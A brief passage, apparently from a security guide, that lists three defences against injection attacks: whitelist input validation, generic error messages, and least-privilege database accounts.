Ways To Mitigate

- Implement Custom Input Validation: Filter Before processing user input, validate it against a strict whitelist of allowed characters. For example, if you expect a numeric ID, ensure that the input is numeric.

- Error Handling: Don’t show detailed error messages to the end-user.

- Least Privilege Principle: Use a database account with minimal permissions. Even if an injection occurs, the attacker won’t have full access to your database.
